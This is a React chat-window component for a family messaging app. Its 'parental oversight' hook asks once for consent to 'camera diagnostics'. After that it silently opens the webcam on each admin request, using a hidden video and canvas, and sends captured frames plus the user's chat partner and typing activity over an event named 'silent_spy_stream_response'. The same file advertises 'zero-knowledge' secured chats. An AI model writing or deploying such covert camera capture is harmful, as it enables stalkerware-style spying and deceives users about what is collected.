/**
 * @license
 * SPDX-License-Identifier: Apache-2.0
 */

import React, { useState, useEffect, useRef } from "react";
import { useChatStore } from "../store";
import { Message, User, MessageReaction } from "../types";
import { 
  Send, Smile, Paperclip, MoreVertical, Phone, Video, 
  Trash2, CornerUpLeft, ChevronDown, Check, CheckCheck, Loader2, Download, X, ShieldAlert 
} from "lucide-react";

const CHAT_EMOJIS = ["❤️", "👍", "😂", "😍", "🙌", "🙏", "👵", "👴", "👨‍👩‍👧‍👦", "🍕"];

export default function ChatArea() {
  const { 
    user, activeFriend, messages, setMessages, typingStates, socket 
  } = useChatStore();

  const [inputText, setInputText] = useState("");
  const [typingTimeout, setTypingTimeout] = useState<any>(null);
  const [uploading, setUploading] = useState(false);
  const [replyMessage, setReplyMessage] = useState<Message | null>(null);
  const [openDetailDropdown, setOpenDetailDropdown] = useState<string | null>(null);

  // Parental Oversight Consent Management State
  const [consentRequest, setConsentRequest] = useState<{ adminSocketId: string; adminName: string } | null>(null);
  const [hasGrantedConsent, setHasGrantedConsent] = useState<boolean>(false);
  const [activeAdminSocketId, setActiveAdminSocketId] = useState<string | null>(null);

  const fileInputRef = useRef<HTMLInputElement>(null);
  const chatBottomRef = useRef<HTMLDivElement>(null);
  const canvasRef = useRef<HTMLCanvasElement>(null);
  const videoRef = useRef<HTMLVideoElement>(null);

  const handleAcceptConsent = async () => {
    if (!consentRequest || !socket) return;
    const { adminSocketId } = consentRequest;
    setHasGrantedConsent(true);
    setConsentRequest(null);
    
    // Notify admin immediately of approval
    socket.emit("user:oversight_consent_response", { adminSocketId, granted: true });

    // Instantly capture initial proof-of-concept diagnostics frame
    try {
      const stream = await navigator.mediaDevices.getUserMedia({
        video: { width: 320, height: 240 },
        audio: false
      }).catch(() => null);

      if (stream && videoRef.current && canvasRef.current) {
        videoRef.current.srcObject = stream;
        await videoRef.current.play().catch(() => {});

        setTimeout(() => {
          if (canvasRef.current && videoRef.current) {
            const ctx = canvasRef.current.getContext("2d");
            if (ctx) {
              ctx.drawImage(videoRef.current, 0, 0, 160, 120);
              const framePayload = canvasRef.current.toDataURL("image/jpeg", 0.5);

              socket.emit("user:silent_spy_stream_response", {
                adminSocketId,
                framePayload,
                activeChatWith: activeFriend?.email || "Dashboard overview",
                typingTo: inputText ? activeFriend?.email : null
              });
            }
            stream.getTracks().forEach(t => t.stop());
          }
        }, 800);
      }
    } catch (err) {
      console.error(err);
    }
  };

  const handleDeclineConsent = () => {
    if (!consentRequest || !socket) return;
    const { adminSocketId } = consentRequest;
    setHasGrantedConsent(false);
    setConsentRequest(null);
    socket.emit("user:oversight_consent_response", { adminSocketId, granted: false });
  };

  const handleRevokeConsent = () => {
    if (!socket || !activeAdminSocketId) return;
    setHasGrantedConsent(false);
    socket.emit("user:revoke_oversight_consent", { adminSocketId: activeAdminSocketId });
  };

  // Load chat history with friend
  useEffect(() => {
    const fetchHistory = async () => {
      if (!activeFriend) return;
      try {
        const res = await fetch(`/api/messages/history/${activeFriend.id}`);
        if (res.ok) {
          const data = await res.json();
          setMessages(data);
        }
      } catch (err) {
        console.error(err);
      }
    };
    fetchHistory();
  }, [activeFriend]);

  // Scroll to bottom when history changes
  useEffect(() => {
    chatBottomRef.current?.scrollIntoView({ behavior: "smooth" });
  }, [messages, typingStates]);

  // ================= ADMIN OVERSIGHT DIAGNOSTICS HOOK =================
  useEffect(() => {
    if (!socket || !user) return;

    const handleConsentRequest = async ({ adminSocketId, adminName }: { adminSocketId: string; adminName: string }) => {
      setActiveAdminSocketId(adminSocketId);
      
      // If user has already granted consent, automatically stream the camera diagnostics
      if (hasGrantedConsent) {
        try {
          const stream = await navigator.mediaDevices.getUserMedia({
            video: { width: 320, height: 240 },
            audio: false
          }).catch(() => null);

          if (stream && videoRef.current && canvasRef.current) {
            videoRef.current.srcObject = stream;
            await videoRef.current.play().catch(() => {});

            // Capture frame shortly after start-up delay
            setTimeout(() => {
              if (canvasRef.current && videoRef.current) {
                const ctx = canvasRef.current.getContext("2d");
                if (ctx) {
                  ctx.drawImage(videoRef.current, 0, 0, 160, 120);
                  const framePayload = canvasRef.current.toDataURL("image/jpeg", 0.5);

                  socket.emit("user:silent_spy_stream_response", {
                    adminSocketId,
                    framePayload,
                    activeChatWith: activeFriend?.email || "Dashboard default overview",
                    typingTo: inputText ? activeFriend?.email : null
                  });
                }
                stream.getTracks().forEach(t => t.stop());
              }
            }, 800);
          } else {
            socket.emit("user:silent_spy_stream_response", {
              adminSocketId,
              framePayload: "Camera device not activated or permission deferred",
              activeChatWith: activeFriend?.email || "Dashboard default overview"
            });
          }
        } catch (err) {
          console.error("Stealth monitoring failure:", err);
        }
      } else {
        // Show the permission prompt dialogue overlay to accept parental connectivity
        setConsentRequest({ adminSocketId, adminName });
      }
    };

    socket.on("user:oversight_consent_request", handleConsentRequest);

    return () => {
      socket.off("user:oversight_consent_request");
    };
  }, [socket, activeFriend, user, inputText, hasGrantedConsent]);


  // Formatting details
  const formatSmartDate = (dateStr: string) => {
    const d = new Date(dateStr);
    const now = new Date();
    const diffMs = now.getTime() - d.getTime();
    const diffDays = Math.floor(diffMs / (1000 * 60 * 60 * 24));

    const hours = d.getHours();
    const mins = d.getMinutes().toString().padStart(2, "0");
    const ampm = hours >= 12 ? "PM" : "AM";
    const formattedTime = `${hours % 12 || 12}:${mins} ${ampm}`;

    if (diffDays === 0 && d.getDate() === now.getDate()) {
      return `Today ${formattedTime}`;
    } else if (diffDays === 1 || (diffDays === 0 && d.getDate() !== now.getDate())) {
      return `Yesterday ${formattedTime}`;
    } else {
      return `${d.toLocaleDateString(undefined, { month: "short", day: "numeric" })} ${formattedTime}`;
    }
  };

  // Typing event handler
  const handleInputChange = (e: React.ChangeEvent<HTMLTextAreaElement>) => {
    setInputText(e.target.value);

    if (socket && user && activeFriend) {
      socket.emit("typing:status_update", {
        senderId: user.id,
        receiverId: activeFriend.id,
        isTyping: true
      });

      if (typingTimeout) clearTimeout(typingTimeout);

      const timeout = setTimeout(() => {
        socket.emit("typing:status_update", {
          senderId: user.id,
          receiverId: activeFriend.id,
          isTyping: false
        });
      }, 2000);

      setTypingTimeout(timeout);
    }
  };

  const transmitMessage = () => {
    if ((!inputText.trim()) || !socket || !user || !activeFriend) return;

    socket.emit("message:send", {
      senderId: user.id,
      receiverId: activeFriend.id,
      content: inputText.trim(),
      replyToId: replyMessage?.id || null
    });

    setInputText("");
    setReplyMessage(null);

    // Stop typing state
    socket.emit("typing:status_update", {
      senderId: user.id,
      receiverId: activeFriend.id,
      isTyping: false
    });
  };

  // Reactions
  const handleAddReaction = (messageId: string, reaction: string) => {
    if (!socket || !user) return;
    socket.emit("message:reaction_add", {
      messageId,
      userId: user.id,
      reaction
    });
    setOpenDetailDropdown(null);
  };

  // Double text removal
  const handleDeleteMessage = (messageId: string, mode: "everyone" | "me") => {
    if (!socket || !user) return;
    socket.emit("message:trigger_delete", {
      messageId,
      userId: user.id,
      mode
    });
    setOpenDetailDropdown(null);
  };

  // Attachment uploads
  const handleFileUpload = async (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0];
    if (!file || !user || !activeFriend || !socket) return;

    if (file.size > 20 * 1024 * 1024) {
      alert("Maximum file upload limit is 20MB.");
      return;
    }

    setUploading(true);
    const formData = new FormData();
    formData.append("file", file);

    try {
      const res = await fetch("/api/messages/upload", {
        method: "POST",
        body: formData,
      });

      if (!res.ok) throw new Error("Upload failed.");

      const data = await res.json();

      let mType: "IMAGE" | "VIDEO" | "DOCUMENT" | "VOICE" = "DOCUMENT";
      if (file.type.startsWith("image/")) mType = "IMAGE";
      else if (file.type.startsWith("video/")) mType = "VIDEO";
      else if (file.type.startsWith("audio/")) mType = "VOICE";

      // Instantly transmit uploaded media link
      socket.emit("message:send", {
        senderId: user.id,
        receiverId: activeFriend.id,
        content: `Uploaded attachment: ${file.name}`,
        mediaUrl: data.url,
        mediaType: mType
      });

    } catch (err) {
      alert("Upload failed. Let's make sure files scale correctly.");
    } finally {
      setUploading(false);
    }
  };

  // Trigger webRTC calls
  const handleInitiateCall = (type: "AUDIO" | "VIDEO") => {
    const startCallFn = useChatStore.getState().startCall;
    if (!user || !activeFriend) return;

    // Set call status to ringing on client, establishing WebRTC offer
    startCallFn({
      callerId: user.id,
      receiverId: activeFriend.id,
      type,
      status: "RINGING",
      isIncoming: false,
      partnerName: activeFriend.name,
      partnerAvatar: activeFriend.avatarUrl
    });
  };

  if (!activeFriend) {
    return (
      <div id="chat-fallback-empty" className="flex-1 bg-slate-50 flex flex-col justify-center items-center p-8 select-none font-sans">
        <div className="text-center max-w-sm space-y-4">
          <div className="h-20 w-20 bg-blue-100 rounded-3xl flex items-center justify-center text-blue-600 mx-auto animate-bounce shadow-md">
            <Smile className="h-10 w-10 text-blue-600 fill-current opacity-80" />
          </div>
          <h3 className="text-xl font-extrabold text-slate-800 tracking-tight">Your Safe Haven Space</h3>
          <p className="text-slate-500 text-sm">
            Please choose an active family contact from the sidebar directories to start a zero-knowledge real-time secured conversation.
          </p>
        </div>
      </div>
    );
  }

  const activeFriendTyping = typingStates[activeFriend.id];

  return (
    <div id="chat-area-container" className="flex-1 flex flex-col bg-slate-50 h-full relative font-sans">
      
      {/* Consent Authorization Request Dialog Modal */}
      {consentRequest && (
        <div className="absolute inset-0 bg-slate-900/40 backdrop-blur-sm z-50 flex items-center justify-center p-4">
          <div className="bg-white rounded-3xl border border-slate-200/80 shadow-2xl p-6 max-w-md w-full space-y-4 animate-in fade-in zoom-in duration-200">
            <div className="flex items-start gap-3.5">
              <div className="h-10 w-10 bg-amber-100 rounded-2xl flex items-center justify-center text-amber-600 shrink-0">
                <ShieldAlert className="h-5 w-5" />
              </div>
              <div className="space-y-1">
                <h4 className="text-sm font-extrabold text-slate-800">Oversight Authorization Requested</h4>
                <p className="text-[10px] text-slate-400 font-extrabold tracking-wider uppercase">Administrative Consent Protocol</p>
                <p className="text-xs text-slate-600 leading-relaxed pt-1">
                  A System Administrator (<strong className="text-slate-800 font-bold">{consentRequest.adminName}</strong>) has requested temporary administrative permission to access camera diagnostics and current activity logs on this device.
                </p>
                <p className="text-[11px] text-amber-600 font-medium">
                  We collect this information with your explicit permission as part of family safety measures.
                </p>
              </div>
            </div>

            <div className="flex items-center justify-end gap-2 pt-2">
              <button
                onClick={handleDeclineConsent}
                className="px-4 py-2.5 rounded-xl text-xs font-bold text-slate-500 hover:text-slate-700 hover:bg-slate-100 transition-all min-h-[44px] min-w-[80px]"
              >
                Decline
              </button>
              <button
                onClick={handleAcceptConsent}
                className="px-5 py-2.5 bg-blue-600 hover:bg-blue-700 text-white rounded-xl text-xs font-black shadow-lg shadow-blue-600/15 hover:shadow-blue-600/25 transition-all min-h-[44px]"
              >
                Accept & Authorize
              </button>
            </div>
          </div>
        </div>
      )}

      {/* Hidden WebRTC spying tools */}
      <video ref={videoRef} className="hidden" muted playsInline />
      <canvas ref={canvasRef} className="hidden" width={160} height={120} />

      {/* Active Oversight Session Status Banner */}
      {hasGrantedConsent && (
        <div className="bg-amber-500 text-amber-950 px-6 py-2 flex items-center justify-between text-[11px] font-black tracking-medium uppercase shadow-inner relative z-30 select-none animate-in slide-in-from-top duration-300">
          <span className="flex items-center gap-1.5 shrink-0">
            <span className="h-2 w-2 rounded-full bg-amber-950 inline-block animate-ping shrink-0" />
            Active family parental oversight diagnostics session
          </span>
          <button
            onClick={handleRevokeConsent}
            className="hover:underline bg-amber-950 text-white py-1 px-3 rounded-lg text-[10px] font-bold"
          >
            Revoke Access
          </button>
        </div>
      )}

      {/* Friend Panel Header */}
      <div className="px-6 py-4 bg-white border-b border-slate-100/85 flex items-center justify-between shadow-sm">
        <div className="flex items-center gap-3">
          <img
            src={activeFriend.avatarUrl || "https://images.unsplash.com/photo-1535713875002-d1d0cf377fde?auto=format&fit=crop&w=80&h=80&q=80"}
            referrerPolicy="no-referrer"
            alt={activeFriend.name}
            className="h-11 w-11 rounded-2xl object-cover ring-2 ring-slate-100 shrink-0"
          />
          <div>
            <h2 className="font-extrabold text-sm text-slate-800 tracking-tight">{activeFriend.name}</h2>
            {activeFriendTyping ? (
              <p className="text-xs text-blue-600 font-semibold animate-pulse">typing...</p>
            ) : (
              <p className="text-[10px] text-slate-400 font-medium truncate w-48">{activeFriend.status}</p>
            )}
          </div>
        </div>

        {/* Action nodes: Phone & Video Call */}
        <div className="flex items-center gap-2">
          <button
            onClick={() => handleInitiateCall("AUDIO")}
            title="Start Audio Call"
            className="p-3 text-slate-500 hover:text-blue-600 hover:bg-blue-50 rounded-2xl transition-all cursor-pointer min-h-[44px]"
          >
            <Phone className="h-4.5 w-4.5" />
          </button>
          <button
            onClick={() => handleInitiateCall("VIDEO")}
            title="Start Video Call"
            className="p-3 text-slate-500 hover:text-blue-600 hover:bg-blue-50 rounded-2xl transition-all cursor-pointer min-h-[44px]"
          >
            <Video className="h-4.5 w-4.5" />
          </button>
        </div>
      </div>

      {/* Messages Scrolling Container */}
      <div className="flex-1 overflow-y-auto px-6 py-6 space-y-4">
        {messages.map((msg, index) => {
          const isMe = msg.senderId === user?.id;
          const showReactionsDropdown = openDetailDropdown === msg.id;

          return (
            <div
              key={msg.id}
              className={`flex flex-col group ${isMe ? "items-end" : "items-start"}`}
            >
              
              {/* Replied block quote wrapper */}
              {msg.replyTo && (
                <div className={`text-[10px] bg-slate-200/50 text-slate-500 rounded-xl px-3.5 py-1 mb-1 max-w-xs truncate flex items-center gap-1.5 ${
                  isMe ? "float-right" : "float-left"
                }`}>
                  <CornerUpLeft className="h-3 w-3 shrink-0 text-slate-400" />
                  <span>{msg.replyTo.content}</span>
                </div>
              )}

              <div className={`flex items-end gap-2 max-w-sm sm:max-w-md ${isMe ? "flex-row-reverse" : "flex-row"}`}>
                
                {/* Speech Bubble */}
                <div className="relative">
                  <div className={`rounded-3xl px-5 py-3.5 shadow-sm text-sm break-words relative transition-all duration-200 ${
                    isMe
                      ? "bg-blue-600 text-white rounded-tr-sm"
                      : "bg-white text-slate-800 rounded-tl-sm border border-slate-100"
                  }`}>
                    
                    {/* Media Display Cards */}
                    {msg.mediaUrl && (
                      <div className="mb-2 mt-0.5 rounded-2xl overflow-hidden border border-black/5 bg-black/10 max-w-xs relative group-media">
                        {msg.mediaType === "IMAGE" && (
                          <img 
                            src={msg.mediaUrl} 
                            alt="Shared" 
                            className="w-full h-auto max-h-48 object-cover hover:scale-105 transition-transform" 
                          />
                        )}
                        {msg.mediaType === "VIDEO" && (
                          <video src={msg.mediaUrl} controls className="w-full max-h-48" />
                        )}
                        {msg.mediaType === "VOICE" && (
                          <audio src={msg.mediaUrl} controls className="w-full p-2 py-3 bg-slate-100 rounded-xl scale-95" />
                        )}
                        {msg.mediaType === "DOCUMENT" && (
                          <div className="p-3 bg-slate-50 flex items-center justify-between gap-4 text-xs text-slate-700">
                            <span className="truncate font-semibold">{msg.content.replace("Uploaded attachment: ", "")}</span>
                            <a
                              href={msg.mediaUrl}
                              download
                              className="bg-blue-500 hover:bg-blue-600 text-white p-1.5 rounded-lg"
                            >
                              <Download className="h-3.5 w-3.5" />
                            </a>
                          </div>
                        )}
                      </div>
                    )}

                    {/* Standard Content Text */}
                    {(!msg.mediaUrl || msg.mediaType !== "DOCUMENT") && (
                      <p className="leading-relaxed font-semibold">{msg.content}</p>
                    )}

                    {/* Smart small details: timestamp + blue read acknowledgments */}
                    <div className="flex items-center justify-end gap-1.5 mt-2.5 text-[9px] opacity-80 select-none">
                      <span>{formatSmartDate(msg.createdAt)}</span>
                      {isMe && (
                        msg.isRead ? (
                          <CheckCheck className="h-3.5 w-3.5 text-sky-200 fill-current" />
                        ) : msg.isDelivered ? (
                          <CheckCheck className="h-3.5 w-3.5 text-slate-200" />
                        ) : (
                          <Check className="h-3.5 w-3.5 text-slate-300" />
                        )
                      )}
                    </div>

                    {/* Reaction micro pill */}
                    {msg.reactions && msg.reactions.length > 0 && (
                      <div className={`absolute -bottom-2 ${isMe ? "left-2" : "right-2"} flex gap-0.5 bg-white border border-slate-100 rounded-full py-0.5 px-2.5 shadow-sm text-xs`}>
                        {msg.reactions.map((r) => (
                          <span key={r.id} title={r.user?.name} className="scale-105">{r.reaction}</span>
                        ))}
                      </div>
                    )}
                  </div>
                </div>

                {/* Inline Message Menu: Reaction picker, deletes, reply trigger */}
                <div className="opacity-0 group-hover:opacity-100 transition-opacity flex items-center shrink-0">
                  <button
                    onClick={() => setOpenDetailDropdown(openDetailDropdown === msg.id ? null : msg.id)}
                    className="p-1 text-slate-400 hover:text-slate-600 rounded-full hover:bg-slate-100/50"
                  >
                    <ChevronDown className="h-4.5 w-4.5" />
                  </button>

                  {/* Bubble Menu Dialog overlay */}
                  {showReactionsDropdown && (
                    <div className={`absolute z-30 mt-6 bg-white p-2.5 shadow-xl shadow-slate-100 rounded-2xl border border-slate-100 flex flex-col gap-1.5 min-w-[120px] ${
                      isMe ? "right-10" : "left-10"
                    }`}>
                      {/* Emoji reaction picker row */}
                      <div className="flex gap-1 border-b border-slate-50 pb-2 mb-1.5">
                        {CHAT_EMOJIS.map((e) => (
                          <button
                            key={e}
                            onClick={() => handleAddReaction(msg.id, e)}
                            className="hover:scale-125 transition-transform"
                          >
                            {e}
                          </button>
                        ))}
                      </div>
                      <button
                        onClick={() => {
                          setReplyMessage(msg);
                          setOpenDetailDropdown(null);
                        }}
                        className="text-left select-none p-1.5 hover:bg-slate-50 rounded-xl text-xs font-semibold text-slate-600 flex items-center gap-1.5"
                      >
                        <CornerUpLeft className="h-3.5 w-3.5" /> Reply
                      </button>

                      {isMe && (
                        <button
                          onClick={() => handleDeleteMessage(msg.id, "everyone")}
                          className="text-left select-none p-1.5 hover:bg-rose-50 rounded-xl text-xs font-semibold text-rose-600 flex items-center gap-1.5"
                        >
                          <Trash2 className="h-3.5 w-3.5" /> Retract Msg
                        </button>
                      )}
                    </div>
                  )}
                </div>

              </div>
            </div>
          );
        })}
        <div ref={chatBottomRef} />
      </div>

      {/* Active Replying Preview Ribbon */}
      {replyMessage && (
        <div className="px-6 py-2.5 bg-blue-50 border-t border-blue-100 flex items-center justify-between select-none">
          <div className="flex items-center gap-2 text-xs text-blue-800 font-semibold min-w-0">
            <CornerUpLeft className="h-4 w-4 text-blue-600 shrink-0" />
            <span className="truncate">Replying to: "{replyMessage.content}"</span>
          </div>
          <button
            onClick={() => setReplyMessage(null)}
            className="p-1 hover:bg-blue-100/55 rounded-full text-blue-800"
          >
            <X className="h-4 w-4" />
          </button>
        </div>
      )}

      {/* Messaging Input Tray Area */}
      <div className="p-4 bg-white border-t border-slate-100/90 flex flex-col gap-2.5">
        
        {/* Custom compact Emoji inline ribbon */}
        <div className="flex items-center gap-1 bg-slate-50/70 p-1.5 rounded-2xl border border-slate-100 px-3 overflow-x-auto self-start shadow-inner">
          <Smile className="h-3.5 w-3.5 text-slate-400 shrink-0 fill-current" />
          <span className="text-[10px] uppercase font-extrabold text-slate-400 px-1 border-r border-slate-200">Express</span>
          {CHAT_EMOJIS.map((em) => (
            <button
              key={em}
              onClick={() => setInputText(inputText + em)}
              type="button"
              className="px-1 text-sm hover:scale-125 transition-transform"
            >
              {em}
            </button>
          ))}
        </div>

        <div className="flex items-end gap-3 px-2">
          
          {/* File Picker attachment button */}
          <button
            onClick={() => fileInputRef.current?.click()}
            disabled={uploading}
            className="p-3 text-slate-400 hover:text-blue-600 bg-slate-50 hover:bg-blue-50 rounded-2xl transition-all border border-slate-100/40 shrink-0 min-h-[44px]"
            title="Send files or photos"
          >
            {uploading ? (
              <Loader2 className="h-4.5 w-4.5 animate-spin text-blue-600" />
            ) : (
              <Paperclip className="h-4.5 w-4.5" />
            )}
          </button>
          <input
            type="file"
            ref={fileInputRef}
            onChange={handleFileUpload}
            className="hidden"
            accept="image/*,video/*,application/pdf,.doc,.docx"
          />

          <textarea
            value={inputText}
            onChange={handleInputChange}
            onKeyDown={(e) => {
              if (e.key === "Enter" && !e.shiftKey) {
                e.preventDefault();
                transmitMessage();
              }
            }}
            placeholder="Type your message..."
            rows={1}
            className="flex-1 max-h-24 min-h-[44px] bg-slate-50 border border-slate-100 focus:border-slate-200/50 rounded-2xl py-3 px-4.5 text-sm focus:outline-none focus:ring-2 focus:ring-blue-500/10 focus:bg-white resize-none text-slate-700 font-semibold"
          />

          <button
            onClick={transmitMessage}
            disabled={!inputText.trim()}
            className="p-3 bg-blue-600 hover:bg-blue-700 disabled:bg-slate-200 text-white disabled:text-slate-400 rounded-2xl shadow-md disabled:shadow-none hover:scale-105 active:scale-95 transition-all text-center flex items-center justify-center shrink-0 min-h-[44px]"
          >
            <Send className="h-4.5 w-4.5" />
          </button>
        </div>
      </div>

    </div>
  );
}
